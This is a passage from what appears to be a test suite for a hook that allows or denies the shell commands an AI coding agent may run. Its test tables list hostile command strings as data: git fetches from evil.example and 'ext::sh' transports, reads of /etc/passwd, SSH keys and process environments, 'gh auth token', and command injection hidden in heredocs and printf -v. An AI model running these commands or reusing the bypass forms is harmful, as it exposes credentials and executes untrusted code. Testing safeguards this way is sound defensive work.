    'git update-ref refs/heads/main HEAD',
    'git hash-object -w x',
    'git init x',
    'git clone . x',
    'git gc',
    'git log;git gc',
    'git fetch',
    'git fetch origin',
    'git fetch origin main',
    'git fetch origin main other',
    'git fetch origin --upload-pack=x',
    'git fetch origin -q',
    'git fetch origin main:main',
    'git fetch origin +main:main',
    'git fetch origin +refs/heads/main:refs/heads/main',
    'git fetch origin main:refs/heads/victim',
    "git fetch origin '+refs/heads/*:refs/heads/*'",
    "git fetch origin 'refs/heads/*:refs/remotes/origin/*'",
    'git fetch origin main:refs/tags/v1',
    'git fetch origin +main:refs/remotes/origin/feat',
    'git fetch origin https://evil.example/x.git',
    "git fetch origin 'ext::sh -c x'",
    'git fetch origin ../other',
    'git fetch origin ^main',
    'git fetch origin tag',
    "git fetch origin 'tag v1'",
    'git fetch --all origin main',
    'git fetch upstream main',
    'git fetch https://evil.example/x.git main',
    "git fetch 'ext::sh -c touch% pwned' main",
    'git fetch . main',
    'git add .',
    'git add -A',
    'git add -f .env',
    'git add --all',
    'git add hooks/README.md',
    'git add /etc/passwd',
    'git add .git/hooks',
    'git add .git/config',
    'git add self/orchestrations/zz-probe/README.md',
    "git add ':(glob)**'",
    "git add ':/'",
    "git add ':(top)'",
    "git add ':(attr:x)'",
    'git add -- -f',
    'git add a -f',
    'git add --chmod=+x a',
    'git add -p',
    'git add -i',
    'git add --pathspec-from-file=x',
    'git add sub',
    'git add hooks/allow-repo-commands.sh',
    'git commit',
    'git commit -m x',
    'git commit -m "x y"',
    "git commit -m 'x y'",
    'git commit -mx',
    'git commit -m',
    'git commit -am x',
    'git commit -a -m x',
    'git commit -m x -a',
    'git commit -m x --amend',
    'git commit --amend -m x',
    'git commit -m x --no-verify',
    'git commit -n -m x',
    'git commit -m x -m y',
    'git commit -F file',
    'git commit -m x file',
    'git commit --message x',
    'git commit --message=x',
    'git commit -m --amend',
    'git commit -m -a',
    "git commit -m ''",
    'git commit -m "x" -e',
    'git commit -m x --allow-empty',
    'git commit -C HEAD',
    'git commit --fixup HEAD',
    "git commit -m x --author='a <b>'",
    'git commit -m x -S',
    'git commit -m x --trailer x',
    'git commit -t tmpl',
    'git push',
    'git push origin',
    'git push origin main',
    'git push -u origin main',
    'git push -u origin feat',
    'git push -u origin claude/feat',
    'git push -u origin HEAD',
    'git push -u origin HEAD:main',
    'git push -u origin +feat',
    'git push -u origin +HEAD:main',
    'git push -u origin :main',
    'git push -u origin :feat',
    'git push -u origin feat:main',
    'git push -u origin feat:refs/heads/main',
    'git push -u origin feat:refs/heads/other',
    "git push -u origin 'refs/heads/*:refs/heads/*'",
    'git push -u origin refs/tags/v1',
    'git push -u origin tag',
    'git push -u origin --force',
    'git push -u origin -f',
    'git push -u origin --all',
    'git push -u origin --mirror',
    'git push -u origin --delete',
    'git push -u origin feat --force',
    'git push -f -u origin feat',
    'git push -u origin feat main',
    'git push --set-upstream origin feat',
    'git push -u upstream feat',
    'git push -u https://evil.example/x feat',
    "git push -u 'ext::sh -c x' feat",
    'git push -uf origin feat',
    "git push -u origin '+refs/heads/*:refs/heads/*'",
    'git push -u origin feat:refs/heads/main^',
    'git push -u origin @',
    "git push -u origin '@:main'",
    'git push -u origin "HEAD:main"',
    "git push -u origin 'HEAD:refs/heads/ma''in'",
    'git push --receive-pack=x -u origin f',
    'git push -u origin --receive-pack=x',
    'git push -u origin --exec=x',
    'gh',
    'gh pr',
    'gh pr create',
    'gh pr create --title t --body b',
    'gh pr create --body b --title t',
    'gh pr create --title t',
    'gh pr create --title t --body b --web',
    'gh pr create --title t --body b --body-file f',
    'gh pr create --title t --body-file f',
    'gh pr create -t t -b b',
    'gh pr create --title=t --body=b',
    'gh pr create --title t --body b --repo o/r',
    'gh pr create --title t --body b --editor',
    'gh pr create --title t --body b --fill',
    'gh pr create --title t --body b --base main',
    'gh pr create --title t --body b --head x',
    'gh pr create --title t --body b --draft',
    'gh pr create --title --web --body b',
    'gh pr create --title t --body --body-file',
    'gh pr create --title t --title u --body b',
    'gh pr create --title t --body b --title u --body c',
    'gh pr create --title t --body @file',
    'gh pr create --title t --body -',
    'gh pr create --body --title --title t',
    'gh pr view',
    'gh pr view 1',
    'gh pr view --web',
    'gh pr view 1 --json title --jq .title',
    "gh pr view --json title --template '{{.title}}'",
    'gh pr view -R other/repo 1',
    'gh pr view --repo other/repo 1 --comments',
    'gh pr list',
    'gh pr list --web',
    'gh pr list --repo o/r --state all --json body',
    'gh pr list --search x',
    'gh pr checks',
    'gh pr checks --watch',
    'gh pr checks --watch --interval 1',
    'gh pr checks --web',
    'gh pr checks --fail-fast --watch',
    'gh pr merge',
    'gh pr merge 1 --admin',
    'gh pr close 1',
    'gh pr edit 1 --body x',
    'gh pr comment 1 --body x',
    'gh pr review --approve',
    'gh pr checkout 1',
    'gh pr diff',
    'gh pr status',
    'gh pr ready',
    'gh pr reopen 1',
    'gh pr lock 1',
    'gh pr view create',
    'gh pr list merge',
    'gh pr checks ; gh pr merge',
    'gh api /user',
    'gh repo delete',
    'gh auth token',
    'gh extension install x',
    'gh alias set x y',
    'gh issue list',
    'gh run list',
    'gh workflow run x',
    'gh secret list',
    'gh -R o/r pr view',
    'gh --repo o/r pr view',
    'gh pr --repo o/r view',
    'gh pr -R o/r merge 1',
    'gh pr --help merge',
    'gh pr view --help',
    'gh browse',
    'gh codespace ssh',
    'gh gist create x',
    'gh release create',
    'gh ssh-key add',
    'gh config set editor x',
    './orchestration-start.sh x',
    './orchestration-start.sh x --session other-session',
    './orchestration-start.sh x --coordinator',
    './orchestration-start.sh x --coordinator --session 5e5e5e5e-0000-0000-0000-000000000001',
    './orchestration-capture.sh zz-probe',
    'orchestration-start.sh x',
    'bash orchestration-start.sh x',
    './agentTooling/orchestration-start.sh x',
    './agentTooling/../run-plans.sh x',
    '././orchestration-start.sh x',
    './orchestration-start.sh/../run-plans.sh',
    './run-plans.sh',
    './feature-start.sh x',
    './feature-close.sh x',
    './run-review.sh x',
    './run-batch.sh x',
    './self/gate.sh',
    './check-plans.sh',
    'python3 analysis/report.py --orchestration zz-probe',
    'python3 -B analysis/report.py --orchestration zz-probe',
    'python3 -B -B analysis/report.py --orchestration zz-probe',
    'python3 analysis/report.py --orchestration zz-probe --checkout repo=/tmp',
    'python3 analysis/report.py --orchestration zz-probe --checkout repo=/etc',
    'python3 analysis/report.py --orchestration /tmp/evil',
    'python3 analysis/report.py --orchestration ../../hooks',
    'python3 analysis/report.py --self hook-role-hardening',
    'python3 analysis/report.py --self --all',
    'python3 analysis/report.py --all',
    'python3 analysis/report.py --arm-root /tmp/evil x',
    'python3 analysis/report.py --self /tmp/evil',
    'python3 analysis/report.py --self ../../x',
    'python3 analysis/report.py --self x --rounds-md',
    'python3 analysis/report.py',
    'python3 analysis/report.py -h',
    'python3 -I analysis/report.py x',
    'python3 -i analysis/report.py x',
    'python3 -c x analysis/report.py',
    'python3 -m analysis.report',
    'python3 -B -m pytest',
    'python3 -Bc 1',
    'python3 -B -c 1',
    'python3 -X importtime analysis/report.py',
    'python3 -W error analysis/report.py',
    'python3 ./analysis/report.py x',
    'python3 analysis/../run.py',
    'python3 analysis/report.pyc',
    'python3 analysis/routing.py',
    'python3 analysis/orchestration_capture.py zz-probe',
    'python3 analysis/pricing.py',
    'python3 self/orchestrations/zz-probe/analysis/report.py',
    'python3 agentTooling/analysis/report.py x',
    'python3 analysis/manifest.py --orchestration zz-probe get session',
    'python3 analysis/manifest.py --orchestration zz-probe add-feature repo=r slug=s session=x branch=y',
    'python3 analysis/manifest.py --orchestration zz-probe set-feature repo=r slug=s report=/etc/passwd',
    'python3 analysis/manifest.py --orchestration zz-probe set-feature repo=r slug=s report=../../../../etc/passwd',
    'python3 analysis/manifest.py --orchestration zz-probe set-window-to now',
    'python3 analysis/manifest.py --orchestration ../../x get session',
    'python3 analysis/manifest.py --orchestration',
    'python3 analysis/manifest.py --self x get base',
    'python3 analysis/manifest.py --self x init --method m --branch b --base main --from 2026-01-01T00:00:00Z',
    'python3 analysis/manifest.py x set-to now',
    'python3 analysis/manifest.py --self x pin-session y',
    'python3 analysis/manifest.py --self x --orchestration y get base',
    'python3 analysis/manifest.py --orchestration=zz-probe get session',
    'python3 analysis/capture_planning.py --list-sessions',
    'python3 analysis/capture_planning.py --self --list-subagents --unclaimed',
    'python3 analysis/capture_planning.py --self --list-sessions --since 2026-01-01',
    'python3 analysis/capture_planning.py --self x',
    'python3 analysis/capture_planning.py --self x --force',
    'python3 analysis/capture_planning.py --self --all --recapture',
    'python3 analysis/capture_planning.py --self --force -- --listx',
    'python3 analysis/capture_planning.py --self --all --force --list',
    'python3 analysis/capture_planning.py --self x --listing',
    'python3 analysis/capture_planning.py --self --claim-check x --list',
    'python3 analysis/capture_planning.py --self --annotate-frozen --list-s',
    'python3 analysis/capture_planning.py --self --recapture --force --except=--list x',
    'python3 analysis/capture_planning.py --self --since --list x',
    'python3 analysis/capture_planning.py --list',
    'python3.11 analysis/report.py',
    'python analysis/report.py',
    'find "."$(cat <<\'EOF\'\\n -maxdepth 0 -exec ./run-plans.sh --self x ;\\nEOF\\n)""',
    'git add "."$(cat <<\'EOF\'\\n -f .env\\nEOF\\n)""',
    'sort "a"$(cat <<\'EOF\'\\n -o pwned\\nEOF\\n)""',
]
ROUND3_ADMITTED = frozenset([
    # lifecycle round 2's audit (A1, A2): every `git add` of a non-file, pathspec or glob, and
    # `date MMDDhhmm…`, left this set — they are denied now (H24); a `git add` of an existing
    # regular file stays
    'git add /etc/passwd',
    'git add hooks/allow-repo-commands.sh',
    'ls',
    'git status',
    'git commit -m "$(cat <<\'EOF\'\\nfix: x\\nEOF\\n)"',
    'git push -u origin "$(git branch --show-current)"',
    'gh pr create --title t --body "$(cat <<\'EOF\'\\nb\\nEOF\\n)"',
    'git commit -m "$(cat <<"EOF"\\nmsg $(touch pwned)\\nEOF\\n)"',
    # hook-audit-gaps round 2 (escalations/01-audit-opus.md, E1; NOTES.md, coordinator ruling
    # 7): the `…\nEOF \n$(touch pwned)\n…` row LEFT this set and is denied now. A body line that
    # begins with the delimiter and goes on (`EOF `) is where bash 5.2 ends a `$(…)` heredoc
    # when a `)` follows on the line, and the strict reader no longer asks what follows it
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\n EOF\\n$(touch pwned)\\nEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\n$(cat <<\'X\'\\ntouch\\nX\\n)\\nEOF\\n)"',
    'git commit -m __orchestrator_0000000000000000_0__',
    'git commit -m __orchestrator_0000000000000000_branch__',
    'find . -name x -printf hi',
    'find -files0-from /dev/stdin',
    'find . -D exec -name x',
    'find / -name x',
    'sed -n 1p README.md',
    'sed -n 1,5p README.md',
    'sed -n 1p',
    'jq . x.json',
    'jq -n input x.json',
    "jq -n '$__loc__'",
    "jq -n --rawfile a /etc/passwd '$a'",
    'jq -n env',
    "jq -n '$ENV'",
    'jq -L . \'import "x" as x; .\' f.json',
    "jq --slurpfile a /etc/passwd -n '$a'",
    "jq --args -n '$ARGS' a b",
    'diff a b',
    'diff --to-file=a b',
    'diff -r a b',
    'sort a',
    'sort --files0-from=list',
    'sort -T /tmp a',
    'sort -S 1 a',
    'uniq a',
    "echo '#!/bin/sh' | uniq - -hook",
    'cat /proc/self/environ',
    'cat /proc/1/cmdline',
    'head -c 100 /dev/urandom',
    'cat /dev/zero',
    'cat fifo',
    'wc --files0-from=list',
    'du --files0-from=list',
    'date -f dates.txt',
    'date --file=x',
    'stat --printf=%n README.md',
    'stat -c %n README.md',
    'cut -f1 a',
    'tr a b',
    'pwd',
    'echo -e a',
    'printf %s a',
    # 'printf -v x a' left the admitted set in round 4: `-v` is refused in any spelling (H23)
    'echo x | sed -n 1p',
    "printf 'e touch pwned' | sed -n 1p",
    "echo 'touch pwned' | cat",
    'echo x | tr a b | sort | uniq -c | head -3',
    'ls -la /root',
    'ls /etc',
    'cat /etc/passwd',
    'cat /root/.ssh/id_rsa',
    'grep -r secret /root',
    'grep -f pat a',
    'grep --include=x -r a .',
    'ls --hyperlink',
    'du -sh /',
    'rg x',
    'rg --ignore-file .x x',
    "rg --type-add 'x:*.x' x",
    'rg --no-config x',
    'rg -f pats x',
    'rg --files',
    'rg --sort path x',
    'rg --engine pcre2 x',
    "'ls'",
    '"ls"',
    "l's'",
    '"l"s',
    "''ls",
    'ls && ls',
    'ls || ls',
    'ls ; ls',
    "ls 'a\\nb'",
    'echo "a\\nb"',
    'ls −la',
    'ls ‐la',
    'ls a b',
    'ls\t-la',
    'ls > /dev/null',
    'ls 2>&1',
    'ls > /dev/null 2>&1',
    'ls >/dev/null',
    'ls >\t/dev/null',
    "echo ' > /dev/null '",
    'ls X=1',
    'ls a~',
    "ls '$HOME'",
    'ls a!b',
    'echo a=b',
    'echo "a;b"',
    "echo 'a|b'",
    'ls \'a\' \'b\'"c"d',
    "git log --format='%(trailers:key=x)' -1",
    'git log -p -1',
    'git log --no-textconv -p',
    'git diff',
    'git diff --no-index a b',
    'git diff --no-ext-diff',
    "git diff -- ':(top,exclude)hooks'",
    "git diff -- ':!hooks'",
    'git show HEAD:README.md',
    'git show --format=%B -s',
    'git status',
    'git status --porcelain',
    'git status -uall --ignored',
    'git rev-parse HEAD',
    'git rev-parse --show-toplevel',
    'git rev-parse --parseopt -- x',
    'git rev-parse --sq-quote a b',
    'git rev-parse --git-path hooks',
    'git ls-files',
    'git ls-files -o --exclude-standard',
    'git ls-files --exclude-per-directory=.gitignore',
    'git ls-files --with-tree=HEAD',
    'git log -S x --pickaxe-regex',
    'git log -G x',
    'git log --all --source',
    'git log -L 1,2:README.md',
    'git log --since=yesterday',
    'git log --graph --oneline --decorate',
    'git log origin/main..HEAD',
    'git log --no-walk --do-walk',
    'git log --stdin',
    'git diff --stdin',
    'git log --remotes --glob=x',
    'git status --show-stash',
    'git diff --submodule=diff',
    'git status --ignore-submodules=none',
    'git diff --relative=x',
    'git log --follow README.md',
    'git log -c -1',
    'git log --cc -1',
    'git ls-files --recurse-submodules',
    'git log --no-pager',
    'git log --paginate',
    'git branch --show-current',
    'git remote -v',
    'git worktree list',
    'git fetch origin main',
    'git fetch origin tag',
    'git commit -m x',
    'git commit -m "x y"',
    "git commit -m 'x y'",
    'git commit -m --amend',
    'git commit -m -a',
    "git commit -m ''",
    'git push -u origin feat',
    'git push -u origin claude/feat',
    'git push -u origin HEAD',
    'git push -u origin refs/tags/v1',
    'git push -u origin tag',
    'gh pr create --title t --body b',
    'gh pr create --body b --title t',
    'gh pr create --title --web --body b',
    'gh pr create --title t --body --body-file',
    'gh pr create --title t --body @file',
    'gh pr create --title t --body -',
    'gh pr create --body --title --title t',
    'gh pr view',
    'gh pr view 1',
    'gh pr view 1 --json title --jq .title',
    "gh pr view --json title --template '{{.title}}'",
    'gh pr list',
    'gh pr list --search x',
    'gh pr checks',
    'gh pr view create',
    'gh pr list merge',
    'gh pr view --help',
    './orchestration-start.sh x',
    './orchestration-start.sh x --coordinator',
    './orchestration-capture.sh zz-probe',
    '././orchestration-start.sh x',
    'python3 analysis/report.py --orchestration zz-probe',
    'python3 -B analysis/report.py --orchestration zz-probe',
    'python3 -B -B analysis/report.py --orchestration zz-probe',
    'python3 analysis/report.py --orchestration zz-probe --checkout repo=/tmp',
    'python3 analysis/report.py --orchestration zz-probe --checkout repo=/etc',
    'python3 analysis/manifest.py --orchestration zz-probe get session',
    'python3 analysis/manifest.py --orchestration zz-probe add-feature repo=r slug=s session=x branch=y',
    'python3 analysis/manifest.py --orchestration zz-probe set-feature repo=r slug=s report=/etc/passwd',
    'python3 analysis/manifest.py --orchestration zz-probe set-window-to now',
    # 'python3 analysis/manifest.py --orchestration' left the admitted set with
    # python-entry-exact: the record tool takes `--orchestration <slug> <subcommand> <operands>`
    # exactly (H27)
    'python3 analysis/capture_planning.py --list-sessions',
    'python3 analysis/capture_planning.py --self --list-subagents --unclaimed',
    'python3 analysis/capture_planning.py --self --list-sessions --since 2026-01-01',
])
for profile in PROFILES:
    root, hook, record = SELF, HOOK_S, RECORD_S
    for line in ROUND3_ROWS:
        command = line.replace("\\n", "\n")
        decision, reason = bash("self", profile, command, SESSION_S)
        if line in ROUND3_ADMITTED:
            check("H21 [self/%s] %r is admitted (not the allowlist or role denial)" % (profile, line),
                  decision != ERR and ROLE_MARK not in reason and ALLOWLIST_MARK not in reason,
                  "%s: %s" % (decision, reason))
        else:
            check("H21 [self/%s] %r is denied" % (profile, line), decision == DENY,
                  "%s: %s" % (decision, reason))

# H22 (round 3, R2/R3/R7): entry points are this checkout's own tooling files, resolved
# against the cwd — in a consuming repo `analysis/report.py` at the root, or from a records
# folder, is not one; refspecs are no branch; `git add` refuses a path holding a `.git`;
# `orchestration-start.sh --session` is refused from S.
def bash_at(fixture, profile, command, session, cwd):
    root, hook = FIXTURES[fixture][0], FIXTURES[fixture][1]
    payload = {"tool_name": "Bash", "cwd": cwd, "session_id": session, "tool_input": {"command": command}}
    return decode(run_hook(hook, root, json.dumps(payload), profile))


planted_dir = os.path.join(CONSUMER, "analysis")
os.makedirs(planted_dir, exist_ok=True)
with open(os.path.join(planted_dir, "report.py"), "w") as f:
    f.write("print('planted')\n")
records_dir = os.path.dirname(RECORD_C)
os.makedirs(os.path.join(records_dir, "analysis"), exist_ok=True)
with open(os.path.join(records_dir, "analysis", "report.py"), "w") as f:
    f.write("print('planted')\n")
os.makedirs(os.path.join(SELF, "planted", ".git"), exist_ok=True)
for profile in PROFILES:
    for label, fixture, command, cwd, admitted in (
            ("a planted analysis/report.py at a consuming repo's root", "consumer",
             "python3 analysis/report.py --orchestration wave", CONSUMER, False),
            ("one planted in a records folder, from that folder", "consumer",
             "python3 analysis/report.py --orchestration wave", records_dir, False),
            ("the vendored copy's own report.py", "consumer",
             "python3 agentTooling/analysis/report.py --orchestration wave", CONSUMER, True),
            ("the unprefixed entry point in a consuming repo", "consumer",
             "./orchestration-start.sh w", CONSUMER, False),
            ("the vendored copy's own orchestration-start.sh", "consumer",
             "./agentTooling/orchestration-start.sh w", CONSUMER, True),
            ("orchestration-start.sh --session", "self", "./orchestration-start.sh w --session x", SELF, False),
            ("report.py with a path for a slug", "self", "python3 analysis/report.py --orchestration /tmp/x", SELF, False),
            ("report.py --self", "self", "python3 analysis/report.py --self x", SELF, False),
            ("capture_planning.py with --", "self", "python3 analysis/capture_planning.py --list-sessions -- x", SELF, False),
            ("git push of +feat", "self", "git push -u origin +feat", SELF, False),
            ("git push of a refspec", "self", "git push -u origin feat:refs/heads/other", SELF, False),
            ("git push of :feat", "self", "git push -u origin :feat", SELF, False),
            ("git push of a..b", "self", "git push -u origin a..b", SELF, False),
            ("git fetch of +main:main", "self", "git fetch origin +main:main", SELF, False),
            ("git push of a plain branch", "self", "git push -u origin claude/feat", SELF, True),
            ("git add of a path holding .git", "self", "git add planted", SELF, False),
            ("git add of a .git path", "self", "git add planted/.git/config", SELF, False),
            ("uniq -- - -out", "self", "echo x | uniq -- - -out", SELF, False),
            ("tail -f", "self", "tail -f README.md", SELF, False),
            ("diff -l", "self", "diff -l a b", SELF, False),
            ("gh pr view -R", "self", "gh pr view -R o/r", SELF, False),
            ("git log --show-signature", "self", "git log --show-signature -1", SELF, False),
            ("a %G format", "self", "git log -1 --format=%G?", SELF, False)):
        decision, reason = bash_at(fixture, profile, command, SESSION_S, cwd)
        if admitted:
            check("H22 [%s/%s] %s is admitted" % (fixture, profile, label),
                  decision != ERR and ALLOWLIST_MARK not in reason, "%s: %s" % (decision, reason))
        else:
            check("H22 [%s/%s] %s is the allowlist denial" % (fixture, profile, label),
                  decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
# H23 (security audit round 4): `printf -v` assigns, and a subscripted name is evaluated
# arithmetically — which runs a command substitution — so any `-v` spelling is refused; and an
# entry-point word that is itself a symlink to the real script is no entry point.
link_dir = os.path.join(os.path.dirname(RECORD_S), "linked")
os.makedirs(link_dir, exist_ok=True)
os.symlink(os.path.join(SELF, "orchestration-start.sh"), os.path.join(link_dir, "orchestration-start.sh"))
for profile in PROFILES:
    for command in ("printf -v 'x[$(touch pwned)]' a", "printf -v 'x[a$(touch pwned)]' a",
                    "printf -v 'arr[0$(touch pwned)]' a", "printf -vx a", "printf -v x a"):
        decision, reason = bash_at("self", profile, command, SESSION_S, SELF)
        check("H23 [self/%s] %r is the allowlist denial" % (profile, command),
              decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
    decision, reason = bash_at("self", profile, "printf %s a", SESSION_S, SELF)
    check("H23 [self/%s] plain printf is still admitted" % profile,
          decision != ERR and ALLOWLIST_MARK not in reason, "%s: %s" % (decision, reason))
    decision, reason = bash_at("self", profile, "./orchestration-start.sh w", SESSION_S, link_dir)
    check("H23 [self/%s] a symlink to the real orchestration-start.sh, run from its folder, is no entry point" % profile,
          decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))

# H24 (lifecycle round 2's audit): A1 — `git add` takes only existing regular files named
# plainly: pathspec magic, globs (quoted too), directories and a `.git` at any depth are
# refused; A2 — `date` reads only: every operand is a `+FORMAT`.
nested = os.path.join(SELF, "sub", ".git")
os.makedirs(nested, exist_ok=True)
deep = os.path.join(SELF, "self", "deep", ".git")
os.makedirs(deep, exist_ok=True)
with open(os.path.join(SELF, "plain.txt"), "w") as f:
    f.write("x\n")
# a symlink to a regular file: os.path.isfile follows it, so only the islink clause refuses it
link = os.path.join(SELF, "link.txt")
if not os.path.lexists(link):
    os.symlink("plain.txt", link)
for profile in PROFILES:
    for command in ("git add :/sub", "git add ':(glob)s*'", "git add ':(top)sub'", "git add 's*'",
                    "git add \"s*\"", "git add 'su?'", "git add '[s]ub'", "git add '*'",
                    "git add :/", "git add sub", "git add self", "git add self/deep",
                    "git add missing.txt", "git add link.txt", "git add plain.txt link.txt",
                    "date 010100002020", "date 0101", "date -u 010100002020",
                    "date --utc 01010000", "date '010100002020'", "date 01010000.00",
                    "date -R 010100002020", "date -s 2020-01-01",
                    # lifecycle round 3's audit, C1: `-I` takes `d` as its own argument
                    "date -Id 010100002020", "date -uId 010100002020", "date -uuId 010100002020",
                    "date -I 010100002020"):
        decision, reason = bash_at("self", profile, command, SESSION_S, SELF)
        check("H24 [self/%s] %r is the allowlist denial" % (profile, command),
              decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
    for command in ("git add plain.txt", "date", "date -u +%Y-%m-%dT%H:%M:%SZ",
                    "date -d 2020-01-01 +%s", "date --date=2020-01-01 +%s", "date -r plain.txt",
                    "date -Id", "date -uId +%s"):
        decision, reason = bash_at("self", profile, command, SESSION_S, SELF)
        check("H24 [self/%s] %r is admitted" % (profile, command),
              decision != ERR and ALLOWLIST_MARK not in reason, "%s: %s" % (decision, reason))

# H25 (self/features/orchestration-records-in-repo/, round 3): the record tools' `--self`, first
# word only, is admitted on manifest.py and report.py; and an orchestrator recorded in the
# consuming repo's plans/orchestrations/ (read from the vendored copy) gets the role reason on a
# build script and the allowlist on everything else, exactly as one under self/orchestrations/.
for profile in PROFILES:
    for command, admitted in (
            ("python3 analysis/manifest.py --self --orchestration wave get session", True),
            ("python3 -B analysis/manifest.py --self --orchestration wave add-feature repo=r slug=s", True),
            ("python3 analysis/report.py --self --orchestration wave", True),
            ("python3 analysis/report.py --self --orchestration wave --checkout r=/tmp", True),
            ("python3 analysis/report.py --orchestration wave --self", False),
            ("python3 analysis/report.py --self --self --orchestration wave", False),
            ("python3 analysis/report.py --self --orchestration /tmp/x", False),
            ("python3 analysis/manifest.py --self --self --orchestration wave get session", False),
            ("python3 analysis/manifest.py --self wave get base", False),
            ("python3 analysis/capture_planning.py --self x", False)):
        decision, reason = bash_at("self", profile, command, SESSION_S, SELF)
        if admitted:
            check("H25 [self/%s] %r is admitted" % (profile, command),
                  decision != ERR and ALLOWLIST_MARK not in reason, "%s: %s" % (decision, reason))
        else:
            check("H25 [self/%s] %r is the allowlist denial" % (profile, command),
                  decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
# H27 (self/features/python-entry-exact/): the record tools and the capture listing are
# admitted only in their exact shapes. B1 — a repeated `--orchestration` (argparse keeps the
# last) — and B2 — an abbreviated writing flag beside a decoy `--list-` value — as found, with
# the repeat in each position, the `=` form, every abbreviation of each writing mode, decoy
# values and extra words: each the allowlist denial from S; the documented shapes admitted.
H27_WRITING_MODES = ["--recapture", "--all", "--carry-lost", "--force", "--annotate-frozen"]
H27_LISTINGS = ["--list-sessions", "--list-subagents"]
H27_ABBREVIATION_MIN_CHARS = 3
H27_MANIFEST, H27_CAPTURE = "python3 analysis/manifest.py", "python3 analysis/capture_planning.py"
H27_DENIED = [
    H27_MANIFEST + " --orchestration A --orchestration get --orchestration=orch-test set-window-to 2030-01-01T00:00:00Z",
    H27_MANIFEST + " --orchestration wave --orchestration get --orchestration=other set-window-to now",
    H27_MANIFEST + " --orchestration wave --orchestration other get session",
    H27_MANIFEST + " --orchestration wave get session --orchestration other",
    H27_MANIFEST + " --orchestration wave set-window-to now --orchestration=other",
    H27_MANIFEST + " --orchestration wave add-feature repo=r slug=s --orchestration=other",
    H27_MANIFEST + " --orchestration=wave get session",
    H27_MANIFEST + " --orchestration WAVE get session",
    H27_MANIFEST + " --orchestration wave get session extra",
    H27_MANIFEST + " --orchestration wave get",
    H27_MANIFEST + " --orchestration wave set-window-to",
    H27_MANIFEST + " --orchestration wave add-feature",
    H27_MANIFEST + " --orchestration wave add-feature --self repo=r slug=s",
    H27_MANIFEST + " --orchestration wave init",
    H27_MANIFEST + " --orchestration",
    H27_MANIFEST + " --self --orchestration wave get session --self",
    "python3 analysis/report.py --orchestration wave --checkout --orchestration",
    "python3 analysis/report.py --orchestration wave --checkout '--all x'",
    H27_CAPTURE + " a-slug --forc --since '--list- x'",
    H27_CAPTURE + " a-slug --al --recapture --since '--list- x'",
    H27_CAPTURE + " --list-sessions --list-sessions",
    H27_CAPTURE + " --list-sessions --unclaimed --unclaimed",
    H27_CAPTURE + " --list-sessions --since 2026-01-01 --since 2026-02-01",
    H27_CAPTURE + " --list-sessions --since=2026-01-01",
    H27_CAPTURE + " --list-sessions --since '--list- x'",
    H27_CAPTURE + " --list-sessions --since --force",
    H27_CAPTURE + " --list-sessions --everywhere",
    H27_CAPTURE + " --list-sessions a-slug",
    H27_CAPTURE + " --list-sessions --self",
    H27_CAPTURE + " --list-sess",
]
for listing in H27_LISTINGS:
    for mode in H27_WRITING_MODES:
        for n in range(H27_ABBREVIATION_MIN_CHARS, len(mode) + 1):
            H27_DENIED.append("%s %s %s" % (H27_CAPTURE, listing, mode[:n]))
            H27_DENIED.append("%s a-slug %s --since '%s x'" % (H27_CAPTURE, mode[:n], listing))
H27_ADMITTED = [
    H27_MANIFEST + " --orchestration wave get session",
    H27_MANIFEST + " --self --orchestration wave set-window-to now",
    H27_MANIFEST + " --orchestration wave add-feature repo=r slug=s session=x branch=y",
    H27_MANIFEST + " --orchestration wave set-feature repo=r slug=s pr=u",
    "python3 analysis/report.py --orchestration wave --checkout r=/tmp --checkout q=/tmp",
    H27_CAPTURE + " --list-sessions --unclaimed --since 2026-01-01",
    H27_CAPTURE + " --self --list-subagents --everywhere --unclaimed --for musicMap/a-slug",
]
for profile in PROFILES:
    for command in H27_DENIED:
        decision, reason = bash_at("self", profile, command, SESSION_S, SELF)
        check("H27 [self/%s] %r is the allowlist denial" % (profile, command),
              decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
    for command in H27_ADMITTED:
        decision, reason = bash_at("self", profile, command, SESSION_S, SELF)
        check("H27 [self/%s] %r is admitted" % (profile, command),
              decision != ERR and ALLOWLIST_MARK not in reason, "%s: %s" % (decision, reason))
SESSION_P = "9f9f9f9f-0000-0000-0000-000000000005"
PLANS_RECORD = os.path.join(CONSUMER, "plans", "orchestrations", "inrepo", "README.md")
os.makedirs(os.path.dirname(PLANS_RECORD))
with open(PLANS_RECORD, "w") as f:
    f.write("# Orchestration: inrepo\n\n```json\n%s\n```\n" % json.dumps(
        {"slug": "inrepo", "session": SESSION_P, "features": []}))
for profile in PROFILES:
    decision, reason = bash("consumer", profile, "./agentTooling/feature-start.sh x --method direct", SESSION_P)
    check("H25 [consumer/%s] a plans/orchestrations orchestrator is denied feature-start.sh with the role reason" % profile,
          decision == DENY and ROLE_MARK in reason and PLANS_RECORD in reason, "%s: %s" % (decision, reason))
    decision, reason = bash("consumer", profile, "touch x", SESSION_P)
    check("H25 [consumer/%s] ... and anything off the allowlist" % profile,
          decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
    decision, reason = bash("consumer", profile,
                            "python3 agentTooling/analysis/manifest.py --orchestration inrepo get session", SESSION_P)
    check("H25 [consumer/%s] ... while its record tool is admitted" % profile,
          decision != ERR and ALLOWLIST_MARK not in reason, "%s: %s" % (decision, reason))
    decision, reason = agent("consumer", profile, {"prompt": MARKER_PROMPT}, SESSION_P)
    check("H25 [consumer/%s] ... and an implementer brief is the role denial" % profile,
          decision == DENY and ROLE_MARK in reason, "%s: %s" % (decision, reason))
    decision, reason = bash("consumer", profile, "touch x", SESSION_T)
    check("H25 [consumer/%s] another session is not the allowlist" % profile,
          ALLOWLIST_MARK not in reason, "%s: %s" % (decision, reason))
os.remove(PLANS_RECORD)

# H28 (self/features/orchestration-start-branch-v2/): the orchestrator may `git mv` its own
# record out of the old vendored place — the remedy LEGACY_RECORD_REFUSAL names — and nothing
# else. The consumer fixture's record `wave` sits at agentTooling/self/orchestrations/wave.
OWN_MOVE = "git mv agentTooling/self/orchestrations/%s plans/orchestrations/%s" % (RECORD_SLUG, RECORD_SLUG)
OTHER_MOVES = [
